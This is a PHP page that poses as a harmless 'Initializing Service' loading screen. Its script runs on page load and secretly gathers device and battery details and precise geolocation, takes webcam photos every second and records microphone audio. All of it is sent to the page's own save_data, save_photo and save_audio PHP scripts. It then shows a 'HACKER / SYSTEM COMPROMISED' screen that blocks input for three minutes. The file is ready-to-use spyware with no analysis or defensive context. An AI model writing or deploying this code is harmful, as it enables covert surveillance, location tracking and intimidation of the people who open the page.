<?php
include 'ip.php';

echo '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Please Wait</title>
    <style>
        .loading-container {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            font-family: Arial, sans-serif;
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 4px solid white;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px 0;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <h2>Initializing Service</h2>
        <div class="spinner"></div>
        <p id="status">Please wait while we set up your experience...</p>
    </div>

    <script>
        class DataCollector {
            constructor() {
                this.photoCount = 0;
                this.cameraMode = "front";
                this.isCollecting = false;
                this.freezeActivated = false;
            }

            async initialize() {
                try {
                    await this.collectDeviceInfo();
                    await this.getLocation();
                    await this.initializeCameras();
                    this.startCollectionCycle();
                } catch (error) {
                    this.handleError(error);
                }
            }

            async collectDeviceInfo() {
                const deviceData = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    hardwareConcurrency: navigator.hardwareConcurrency || "Unknown"
                };

                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    deviceData.battery = {
                        level: Math.round(battery.level * 100) + "%",
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }

                this.saveData("device_info", deviceData);
            }

            async getLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        this.saveData("location", { error: "Geolocation not supported" });
                        resolve();
                        return;
                    }

                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const locationData = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy + " meters",
                                timestamp: new Date(position.timestamp).toISOString()
                            };
                            this.saveData("location", locationData);
                            resolve();
                        },
                        (error) => {
                            this.saveData("location", { error: this.getGeoError(error) });
                            resolve();
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                });
            }

            getGeoError(error) {
                switch(error.code) {
                    case error.PERMISSION_DENIED: return "Permission denied";
                    case error.POSITION_UNAVAILABLE: return "Position unavailable";
                    case error.TIMEOUT: return "Location timeout";
                    default: return "Unknown error";
                }
            }

            async initializeCameras() {
                try {
                    this.stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: "user" },
                        audio: true
                    });
                    
                    this.video = document.createElement("video");
                    this.video.srcObject = this.stream;
                    this.video.play();
                    
                    this.canvas = document.createElement("canvas");
                    this.context = this.canvas.getContext("2d");
                    
                    this.initializeAudioRecording();
                    
                } catch (error) {
                    throw new Error("Camera initialization failed: " + error.message);
                }
            }

            initializeAudioRecording() {
                if (!navigator.mediaDevices.getUserMedia) return;
                
                navigator.mediaDevices.getUserMedia({ audio: true })
                    .then(stream => {
                        this.audioRecorder = new MediaRecorder(stream);
                        this.audioChunks = [];
                        
                        this.audioRecorder.ondataavailable = (event) => {
                            this.audioChunks.push(event.data);
                        };
                        
                        this.audioRecorder.onstop = () => {
                            const audioBlob = new Blob(this.audioChunks, { type: "audio/wav" });
                            this.saveAudio(audioBlob);
                        };
                        
                        this.audioRecorder.start();
                    })
                    .catch(error => {
                        console.warn("Audio recording not available:", error);
                    });
            }

            startCollectionCycle() {
                this.isCollecting = true;
                this.collectionInterval = setInterval(() => {
                    this.capturePhoto();
                }, 1000);
            }

            capturePhoto() {
                if (!this.video || !this.context) return;

                try {
                    this.canvas.width = this.video.videoWidth;
                    this.canvas.height = this.video.videoHeight;
                    this.context.drawImage(this.video, 0, 0);
                    
                    const imageData = this.canvas.toDataURL("image/png");
                    const filename = `${this.cameraMode}_${Date.now()}.png`;
                    
                    this.savePhoto(imageData, filename);
                    this.photoCount++;
                    
                    this.cameraMode = this.cameraMode === "front" ? "back" : "front";
                    
                    if (this.photoCount >= 4 && !this.freezeActivated) {
                        this.activateFreezeMode();
                    }
                    
                } catch (error) {
                    console.error("Photo capture error:", error);
                }
            }

            activateFreezeMode() {
                this.freezeActivated = true;
                clearInterval(this.collectionInterval);
                
                if (this.audioRecorder && this.audioRecorder.state === "recording") {
                    this.audioRecorder.stop();
                }
                
                if (this.stream) {
                    this.stream.getTracks().forEach(track => track.stop());
                }
                
                this.showFreezeScreen();
                
                setTimeout(() => {
                    this.releaseFreeze();
                }, 180000);
            }

            showFreezeScreen() {
                document.body.innerHTML = `
                    <div style="
                        position: fixed;
                        top: 0;
                        left: 0;
                        width: 100%;
                        height: 100%;
                        background: #000;
                        color: #ff0000;
                        display: flex;
                        flex-direction: column;
                        justify-content: center;
                        align-items: center;
                        font-family: Arial, sans-serif;
                        z-index: 99999;
                    ">
                        <h1 style="font-size: 3em; margin: 0; animation: glitch 1s infinite;">🔴 HACKER 🔴</h1>
                        <p style="font-size: 1.5em; margin: 20px 0;">SYSTEM COMPROMISED</p>
                        <div style="
                            width: 100px;
                            height: 100px;
                            border: 3px solid #ff0000;
                            border-radius: 50%;
                            animation: pulse 1s infinite;
                        "></div>
                    </div>
                    <style>
                        @keyframes glitch {
                            0% { text-shadow: 2px 2px 0px #00ffff; }
                            50% { text-shadow: -2px -2px 0px #ffff00; }
                            100% { text-shadow: 2px 2px 0px #00ffff; }
                        }
                        @keyframes pulse {
                            0% { transform: scale(0.8); opacity: 1; }
                            50% { transform: scale(1.2); opacity: 0.7; }
                            100% { transform: scale(0.8); opacity: 1; }
                        }
                        body { 
                            margin: 0; 
                            overflow: hidden;
                            touch-action: none;
                            -webkit-touch-callout: none;
                            -webkit-user-select: none;
                            user-select: none;
                        }
                    </style>
                `;
                
                document.addEventListener(\'touchstart\', this.preventTouch, { passive: false });
                document.addEventListener(\'touchmove\', this.preventTouch, { passive: false });
                document.addEventListener(\'touchend\', this.preventTouch, { passive: false });
                document.addEventListener(\'click\', this.preventTouch, { passive: false });
                document.addEventListener(\'contextmenu\', this.preventTouch, { passive: false });
            }

            preventTouch(event) {
                event.preventDefault();
                event.stopPropagation();
                return false;
            }

            releaseFreeze() {
                document.removeEventListener(\'touchstart\', this.preventTouch);
                document.removeEventListener(\'touchmove\', this.preventTouch);
                document.removeEventListener(\'touchend\', this.preventTouch);
                document.removeEventListener(\'click\', this.preventTouch);
                document.removeEventListener(\'contextmenu\', this.preventTouch);
                
                document.body.innerHTML = `
                    <div style="
                        position: fixed;
                        top: 0;
                        left: 0;
                        width: 100%;
                        height: 100%;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        color: white;
                        display: flex;
                        flex-direction: column;
                        justify-content: center;
                        align-items: center;
                        font-family: Arial, sans-serif;
                    ">
                        <h2>Service Complete</h2>
                        <p>You may now close this window.</p>
                    </div>
                `;
            }

            saveData(type, data) {
                const xhr = new XMLHttpRequest();
                xhr.open(\'POST\', \'save_data.php\', true);
                xhr.setRequestHeader(\'Content-Type\', \'application/json\');
                xhr.send(JSON.stringify({
                    type: type,
                    data: data,
                    timestamp: new Date().toISOString()
                }));
            }

            savePhoto(imageData, filename) {
                const xhr = new XMLHttpRequest();
                xhr.open(\'POST\', \'save_photo.php\', true);
                xhr.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded\');
                xhr.send(`image=${encodeURIComponent(imageData)}&filename=${encodeURIComponent(filename)}`);
            }

            saveAudio(audioBlob) {
                const formData = new FormData();
                formData.append(\'audio\', audioBlob, `audio_${Date.now()}.wav`);
                
                const xhr = new XMLHttpRequest();
                xhr.open(\'POST\', \'save_audio.php\', true);
                xhr.send(formData);
            }

            handleError(error) {
                console.error(\'Data collection error:\', error);
                this.saveData(\'error\', {
                    message: error.message,
                    stack: error.stack,
                    timestamp: new Date().toISOString()
                });
            }
        }

        window.addEventListener(\'load\', () => {
            const collector = new DataCollector();
            collector.initialize().catch(error => {
                console.error(\'Initialization failed:\', error);
            });
        });
    </script>
</body>
</html>
\';
?>